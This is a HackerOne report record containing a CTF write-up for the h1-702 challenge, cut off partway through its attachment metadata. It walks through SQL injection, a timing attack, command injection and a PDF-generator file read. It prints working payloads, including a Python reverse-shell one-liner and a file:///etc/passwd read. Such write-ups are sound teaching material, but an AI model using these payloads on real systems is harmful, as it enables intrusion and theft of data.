@@ -1,0 +1,310 @@
+{
+  "id": 507148,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDcxNDg=",
+  "url": "https://hackerone.com/reports/507148",
+  "title": "`Cody trolled us all` h1-702 CTF write-up",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2019-03-09T14:01:50.784Z",
+  "submitted_at": "2019-03-09T14:01:50.784Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lucio",
+    "url": "/lucio",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/050/bb234dcfd4639de4529b14592926e18b93ea2349_original.png/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 38489,
+    "url": "https://hackerone.com/50m-ctf",
+    "handle": "50m-ctf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "50m-ctf",
+      "twitter_handle": null,
+      "website": "https://hackerone.com/",
+      "about": null
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-04-08T15:54:14.999Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-04-08T15:54:04.072Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "###Premise\n\nI use not to play CTF challenges because they usually absorb me entirely. I cannot think of anything else but \"I want that flag!\". That said, this is going to be a long story: no princess, no dragoons, only a tweet.\n\n[https://twitter.com/Hacker0x01/status/1100543680383832065](https://twitter.com/Hacker0x01/status/1100543680383832065)\n\n###Level 0 - Nothing to be worried about\n\nIt's everyday use to share images on Twitter, but those are more than pictures. Quite easy to understand that, to find the next level (yes, the next level, because the tweet itself is the first one) we have to play with one or both. Steganography might be annoying sometimes, but it's something we can handle. Indeed, `zsteg` is a useful utility that automatically checks for hidden text inside a picture using different methods. All we have to do is:\n\n```shell\nzsteg image.png -a\n```\n\nAfter a few seconds, something caught my attention. Among other strings, a link came up:\n\n{F437580}\n\nFollowing the link and downloading the APK file we can finally say that our long journey is about to start.\n\n###My daily ratio of Java\n\nReverse engineering is a simple task when we're talking about **Java**. The bytecode can be decompiled, and a bad guy can go through each LOC looking for bugs and developer's leftovers. **Jadx** is the only utility we need for this step. Once opened, I immediately noticed that I was going to deal - apparently - with a client/server app, so I decided to run it on the emulator that comes along with the **Android SDK**. Moreover, some of the methods were not decompiled. Long short story, the app was supposed to be a remote thermostat controller. The first thing to do to control the temperature is to authenticate using username and password. \n\n{F438184}\n\nWondering what the username and password are?\n\n**admin** : **password**\n\nWe're in!\n\n{F438185}\n\nUnder the hood, the traffic between the client and the server is encrypted. Let's check the functions that encrypt and decrypt messages.\n\n{F437581}\n\nEasy as pie, you can choose whether literally clone it or write a port in any other language. Since I'm a **GO** lover, I decided to craft a go script for the purpose.\n\nThere're two kinds of JSON payloads:\n\n```json\n{ username: \"admin\", password: \"password\", cmd: \"getTemp\" }\n{ username: \"admin\", password: \"password\", cmd: \"setTemp\", temp: ... }\n```\n\nThe first one is used to retrieve the current target temperature whereas the second one is used to set the desired temperature. My initial thought was that, probably, there were more commands. So, after writing a few lines of code, I started a brute force attack hoping to spot the right command. Unfortunately, nothing came up. I decided to move to a different kind of approach: an **SQLi**. Since the get and set commands were not working, it was pretty clear that I had to poke around username and password.\n\nAfter some time, it turned out that the username field was actually injectable.\n\n```json\n{ username: \"admin' UNION SELECT SLEEP(1337) ;--\", password: \"password\", cmd: \"getTemp\" }\n```\n\nThe payload held the server from responding to for a significant amount of time. It was late, my eyes were closing, and the first idea I had was to write down some lines to exfiltrate each table using a time-based attack — one of the worse idea I've ever had. After a rest, with a clear mind, I immediately noticed that I could get every info using a boolean based attack. Indeed, when the query was successful, the server returned a success payload whereas it returned an error when the query wasn't.\n\n[Here](https://gist.github.com/luc10/975115083e3d003dfa3d5aeef26ea76f) you can find the tool I wrote to exfiltrate data.\n\nThe database contains two tables: `devices` and `users`. The first one immediately took my attention. Maybe there's more in that table that can help me to reach the target, I thought. The table has only two columns: `id` and `ip`.\n\nMy [tool](https://gist.github.com/luc10/975115083e3d003dfa3d5aeef26ea76f) took a long time to dump the whole ip column. You can see the dump [here](https://gist.github.com/luc10/06494c130c6bdc2f88b64e1500a18ee7). A long list of IPs some of which are reserved ones. Though, the first one stood out: `104.196.12.98`.\n\n###Time flies\n\nThe server at `104.196.12.98` presents us with a login panel.\n\n{F438191}\n\nFirst things first, let's check the source. Indeed, the page embeds a js file named [login.js](https://gist.github.com/luc10/a1883cc8cd485d0c213a53dfa8c36452). Basically, username and password are chained and hashed using a kind of **RC4-based** hash algorithm. I spent much time struggling with this. Directory and file discovery, brute force credentials, a flaw in the algorithm, nothing worked. I came back then looking for something else in the database and noticed that there were two other login details. Guess what? None was valid though. \n\nNot sure if your connection is worse than mine, but while playing with the hash, I noticed that the server took different time to give a response based on the length of the provided hash. More specifically, if the supplied hash was 64 chars length, the server took a few more ms to reply. Not a coincidence perhaps. \n\n```shell\ncurl 'http://104.196.12.98/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept-Encoding: gzip, deflate' --data 'hash=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' --compressed -o /dev/null -s -w '%{time_starttransfer}\\n'\n\n0.643ms\n```\n\n```shell\ncurl 'http://104.196.12.98/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept-Encoding: gzip, deflate' --data 'hash=' --compressed -o /dev/null -s -w '%{time_starttransfer}\\n'\n\n0.141ms\n```\n\nAfter testing this a lot, I ended up that it wasn't a coincidence! There's something behind that checks the whole hash char by char. Back on my IDE, and faster than the light I wrote a [tool](https://gist.github.com/luc10/43fb370d8d4ac20af884644136578dd1) to brute the hash and keep track of timings. Although, but it hasn't worked anymore until I accidentally put in a byte, not a single char that would be treated as a nibble, but a whole byte. The comparison is made a single byte at a time. To ensure best results, I moved the [tool](https://gist.github.com/luc10/43fb370d8d4ac20af884644136578dd1) on a remote VPS I own. There you go with my results:\n\n{F438192}\n\nNot sure if you may imagine how long it takes, but it takes a lot. The hardest issue was in having reliable results to keep going guessing. Therefore, moving to a VPS was a good call. \n\nThe final hash is `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`. Now we can finally log in!\n\n###There's no reason to heat up yet\n\nOnce in we're presented with a minimal menu and two options. \n\n{F438195}\n\nLet's see the page source:\n\n```html\n<ul>\n    <li><a href=\"/control\">Temperature control</a></li>\n    <li><a href=\"/update\">Check for updates</a></li>\n    <!--<li><a href=\"/diagnostics\">Diagnostics</a></li>-->\n</ul>\n```\n\nNice! It seems that someone just wrapped an interesting route in a comment to keep it secret. Unfortunately, the `/diagnostics` route gives us a `Forbidden` error. Need to go deeper:\n\n- `/control` allows to set the target temperature;\n- `/update`  handles the update mechanism of our thermostat.\n\nWell, we're dealing with a flask app - previously identified -. An **SSTI** it's worth a try. Unfortunately, if you provide a temperature value different than a number, the app correctly handles our input and give us an error. We can move to `/update`.\n\n```html\nFliteThermostat Check for Updates\nConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nThe second line made me think of a possible way to control the endpoint, the port or even both. Using the [param-miner](https://github.com/PortSwigger/param-miner/blob/master/resources/params) list, I dug for secret params using a disposable tool strictly written in **GO**. After a few minutes, I got a `500` from the server due to an invalid `port` passed via the - obviously - `port` **GET** param.\n\nAt first sight, I thought it was possible to control only part of the **URL**. The aim was to exploit an **SSRF**. Moreover, that's where I literally got stuck for almost two or three days until I came across this [tweet](https://twitter.com/daeken/status/1101358829168558080).\n\nA single underscore is meaningless, but what if it's a part of a second hidden param that lets me take control of the address. Slightly edited the tool and fed it with the [param-miner](https://github.com/PortSwigger/param-miner/blob/master/resources/params) list. This time I was looking for any possible get param with an underscore between two chars in its name. For instance, if we consider the word `host`, every word we can derive from it throwing in an underscore is: `h_ost`, `ho_st`, `hos_t`. Since this way didn't give me the expected result I also tried with char substitution: `_ost`, `h_st`, `ho_t`, `hos_`.\n\nNo luck! I decided to take a break and spend some time skating. In case you're wondering if I'm about to say that something that happened while skating helped me to solve this step then the answer is no!\n\nStill on the same decision that the underscore has got something to do with the CTF I ended up in manually entering words in a slice (an array for non-GO devs) and combine each element with one another using `_` as a connection. Briefly:\n\n```go\nwords := []string{\"host\", \"name\", \"update\", \"upgrade\", \"address\", \"url\", \"endpoint\"}\nfor _, left := range words {\n    for, _ right := range words {\n        checkForWeirdServerBehavior(left + '_' + right)\n    }\n}\n```\n\nBelieve me or not, but it worked. There was another secret param: `update_host`.\n\n{F438197}\n\n###Lucky number 7\n\nAs I told a few lines above, the aim was to exploit an SSRF. Few lines of code in and there we go with a port scanning. During the scan, I decided to try some payloads, and since we're speaking of a flask app, an SSTI might always be at the corner.\n\n`http://104.196.12.98/update?update_host={{ 7 * 7 }}&port=1337`\n\n49 you would scream out loud. Wrong!\n\n{F438198}\n\n```html\nFliteThermostat Check for Updates\nConnecting to http://{{ 7 Dockerfile __pycache__ login.js main.py requirements.txt templates temptarget update.sh uwsgi.ini 7 }}:80/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nIt's a **Command Injection**, not an **SSRF** nor an **SSTI**. Quite easy from this point to spawn a reverse shell.\n\n```\nhttp://104.196.12.98/update?update_host= $(python -c %27import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);%27)&port=1337\n```\n\n{F438200}\n\n###Where's my flag?\n\nOut of curiosity, before going further and look for the flag I had a sneak peek into `main.py`. There you go the hash check code:\n\n```python\nif request.method == 'POST':\n        h = request.form['hash']\n        if len(h) != 64:\n            error = True\n        else:\n            for i in range(0, 64, 2):\n                time.sleep(0.5)\n                if validLogin[i:i+2] != h[i:i+2]:\n                    error = True\n                    break\n        if not error:\n            session['loggedIn'] = True\n            return redirect('/main')\n```\n\nAs expected, the code sleeps for 0.5sec at every iteration and quits when the bytes don't match. That said, we can go ahead. After digging quite a lot, I figured out that the flag file wasn't in that server. There's something more to play with. I thought I had to pull the docker image, so I started playing with the GCloud token fetched using the metadata URL accessible from within the container, and it was a failure because I didn't immediately notice that the token hadn't the right permission to let me pull the image.\n\nObsessed by brute force, I edited once again the tool and looked for most known ports under the `172.20.0.1` net, and it was a good call. There was another app running behind the NAT at `172.20.0.3:80`. Someone probably messed up things, and the app was moved to `172.21.0.3:80` the day after. That's why I'm going to refer to`172.21.0.3`.\n\n###Show me your dirty secrets\n\nIn the excitement, I started `curl`-ing the app but to have a clear idea of what to do I decided to set up an SSH tunneling. Briefly, it's possible to expose the app behind the NAT using a built-in command: `ssh`. Since we can't write anything on the disk and ssh works with public keys that need to be written under the `/.ssh/` folder I had to change some settings of a web server I own to allow passwordless authentication.\n\nThe final command looks like:\n\n```shell\nssh -o PreferredAuthentications=password \\\n    -o PubkeyAuthentication=no \\\n    -o StrictHostKeyChecking=no \\\n    -fN -R *:31337:172.21.0.3:80 username@myhost\n```\n\nI could finally browse the web app using Chrome. PS: Sometimes the tunneling stopped working without a valid reason. Checking the running processes on the server, I noticed that someone else literally copied my command and tunneled the traffic to his server. Hope you got the flag too!\n\n{F438208}\n\n###Seriously?\n\nA login panel, again; a link wrapped in a comment, again. This time I had the feeling that that link would've been the right path to follow. Overthinking has always brought me far away from the actual solution of the previous steps - except for the hash challenge -. Let's give a closer look at the `/invoices/new` path and skip the auth part.\n\n{F438209}\n\nCool! It seems an HTML to PDF converter. There's even a js file that contains interesting stuff.\n\n```js\nfunction encodeInvoice() {\n   ...\n\n    var jobj = {\n        companyName: $('#recipient-company-name').val(),\n        email: $('#recipient-email').val(),\n        invoiceNumber: $('#invoice-number').val(),\n        date: $('#invoice-date').val(),\n        items: items,\n        styles: {body: {'background-color' : 'white'}}\n    };\n\n    var p = JSON.stringify(jobj);\n    return p;\n}\n\nfunction preview() {\n    // kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH\n    //  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9\n    var p = encodeInvoice();\n    var url = 'http://' + window.location.hostname + '/invoices/preview?d=' + encodeURIComponent(p);\n    url = url.replace(/[\\u00A0-\\u9999<>\\&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });\n    $('#iframe-box').empty();\n    $('#iframe-box').append($('<iframe width=\"100%\" height=\"500px\" src=\"' + url + '\"></iframe>'));\n}\n\nfunction savePDF() {\n    var p = encodeInvoice();\n    var url = 'http://' + window.location.hostname + '/invoices/pdfize?d=' + encodeURIComponent(p);\n    url = url.replace(/[\\u00A0-\\u9999<>\\&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });\n    var a = $('<a download href=\"' + url + '\"><span><i>If your download does not start, click here</i></span></a>');\n    $('#iframe-box').append(a);\n    a.find('span').trigger('click');\n}\n```\n\n`kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH` base64 encoded stuff. Hmm... No, you're not gonna troll me again Cody!\n\nAs you might've already noticed, the server allows to define custom **CSS** rules: ` styles: {body: {'background-color' : 'white'}}`. Therefore, it suddenly made me think that probably I could embed a local file using the `background` property set to `url('file://file_to_embed')`. It would've been too easy, but there's no harm in trying. \n\nNext step was to check if there was some egress. So, I pointed the body background image through the proper CSS rule to a local web server, and I got hit. Immediately stood out the `Referrer` header: `WeasyPrint 44 (http://weasyprint.org/)`. \n\n[WeasyPrint](https://github.com/Kozea/WeasyPrint/) is an open source project, so I pulled the repo and started looking for bugs. Since my first idea was to embed a local file, but I didn't succeed, I looked for the filter that cuts out that scheme and doesn't allow to embed local files, and to my astonishment, **I realized that there wasn't.**\n\nIt didn't take so much to understand that images must be valid images or they would be discarded - yeah, nice catch Sherlock - but something in the `html.py` file caught my attention.\n\n```python\nelif element.tag == 'link' and element_has_link_type(\n                element, 'attachment'):\n            url = get_url_attribute(element, 'href', base_url)\n            title = element.get('title', None)\n            if url is None:\n                LOGGER.error('Missing href in <link rel=\"attachment\">')\n            else:\n                attachments.append((url, title))\n```\n\nEasy as pie. The _only thing_ that stood between me and the LFI was a `link` tag with `rel` and `href` attributes respectively set to `attachment` and `file://file_to_embed`. The PDF converter module would've done the trick then.\n\n###Can't be a hacker if you can't pop an alert(0)\n\nThings were getting clear. The preview was there for a reason and the reason was that I had to exploit the **LFI** using a `link` tag, but in order to do that, I had to inject that `link` tag before. I started playing with every property of the `jobj` you can see above.\n\nEvery useful char that led to an **XSS** was replaced: `<` became `&lt;`, `>` became `&gt;` and so forth.\n\nIronically, the tag property that wasn't sanitized correctly was also the one I didn't play with. It took me a couple of hours to figure it out, but at late night, this:\n\n```js\njobj = {\n    ...\n    styles: {body: {'<img>' : ''}}\n}\n```\n\nbecame this:\n\n{F438211}\n\n###Two is better than one\n\nOur long journey into this has not finished yet. Cody still has something in store for us. Although we can inject a custom HTML tag, we need to escape the `style` one to inject our special `<link>` correctly, but it's not so immediate. Indeed, the filter seems to cut out the closing style tag `</style>`. A few minutes afterward I had my payload:\n\n```js\njobj = {\n    ...\n    styles: {body: {\"<</style>/style><link rel='attachment' href='file:///etc/passwd'><style>\" : ''}}\n}\n```\n\nI usually happens when the filter removes only the first instance of the match and doesn't iterate over the input until there's not a match anymore.\n\nThe whole URL looks like:\n\n`http://myhost:31337/invoices/preview?d={\"companyName\":\"\",\"email\":\"\",\"invoiceNumber\":\"\",\"date\":\"\",\"items\":[[\"1\",\"\",\"\",\"10\"]],\"styles\":{\"body\":{\"<</style>/style><link rel='attachment' href='file:///etc/passwd'><style>\":\"\"}}}`\n\nAs said, the filter replaces the first match but keeps the remaining string as is.\n\n{F438212}\n\n###Level-?\n\nI didn't count how many steps there were but, fortunately, this was the last one. No juggling here, instead of looking for a flag file I straightly went for the `main.py` file`\n\nThe resulting pdf usually contains compressed stuff to save space. There's a useful utility for the scope: `qpdf`.\n\n```shell\nqpdf --stream-data=uncompress pdfize.pdf uncompressed-pdfize.pdf\n```\n\nBig surprise, the flag was there!\n\n```\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n```\n\n###I feel you\n\nThough I was done, I checked the rest of [main.py](https://gist.github.com/luc10/5c0ab46fcb49aff0cf314a413a82ee7a) and I got a connection with Cody's troll part:\n\n```python\n@app.route('/auth', methods=['GET', 'POST'])\ndef auth(page=None):\n    error = None\n    if request.method == 'POST':\n        password = request.form['password']\n        error = makeSqlError(password)\n        if error is False or (\"'\" in password and 'sqlmap' in request.headers.get('User-Agent') and random.randrange(3) != 0):\n            raise Exception('SQL Error')\n    return render('login', page=page or 'login', error=error)\n\ndef makeSqlError(password):\n    password = \"'\" + password + \"'\"\n    quotes = 0\n    escape = False\n    nonquoted = ''\n    for c in password:\n        if escape:\n            escape = False\n        elif c == '\\\\':\n            escape = True\n        elif c == '\\'':\n            quotes += 1\n        elif (quotes & 1) == 0:\n            nonquoted += c\n\n    if (quotes & 1) != 0:\n        return False\n    elif ' OR ' in nonquoted:\n        return 'Invalid password'\n    elif 'UNION' in nonquoted:\n        return 'Invalid username'\n    return 'Invalid username or password'\n```\n\nI feel all of you guys who struggled with these fake error messages. **Definitely, it was a good call skipping the auth part.**\n\n###Final thoughts\n\nNo need to say that I learned a lot playing this even though the idea to choke someone surfaced more than once :D\n\nThanks fly out to Cody for this awesome challenge! I hope to see more from you. Not shortly though; I still need time to recover from this one.\n\n*~ Aspera perpessu fiunt iucunda relatu*\n\n## Impact\n\n- Swear and curse;\n- Sleepless nights;\n- Throw laptop out the window;\n\nIf all of the above conditions are met: **Self-Destruct**",
+  "weakness": {
+    "id": 35,
+    "name": "Use of Hard-coded Cryptographic Key"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 437580,
+      "file_name": "zsteg-output.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/580/521bca4fd0019fb5fbcd44844c77acf45b2dfca0/zsteg-output.png?response-content-disposition=attachment%3B%20filename%3D%22zsteg-output.png%22%3B%20filename%2A%3DUTF-8%27%27zsteg-output.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074422Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=715deb91116796547de80f8c0ed59a7e9cd3d25d1d73333fdb41370eaa5c2ef2",
+      "file_size": 339849,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 437581,
+      "file_name": "h1-apk-source.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/581/da40ff68ac3aa2e6df1d5c94f810c67df54c6ef2/h1-apk-source.png?response-content-disposition=attachment%3B%20filename%3D%22h1-apk-source.png%22%3B%20filename%2A%3DUTF-8%27%27h1-apk-source.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074422Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=27ff0fb08ca6cbb692ba542ecad4fb4addaa90a39b731e72080cb1d0751fa241",
+      "file_size": 689051,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 438184,
+      "file_name": "h1-thermostat-app-login.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/184/15fa6a716bafa501de5ef15009a3f9390d96cbe8/h1-thermostat-app-login.png?response-content-disposition=attachment%3B%20filename%3D%22h1-thermostat-app-login.png%22%3B%20filename%2A%3DUTF-8%27%27h1-thermostat-app-login.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074422Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%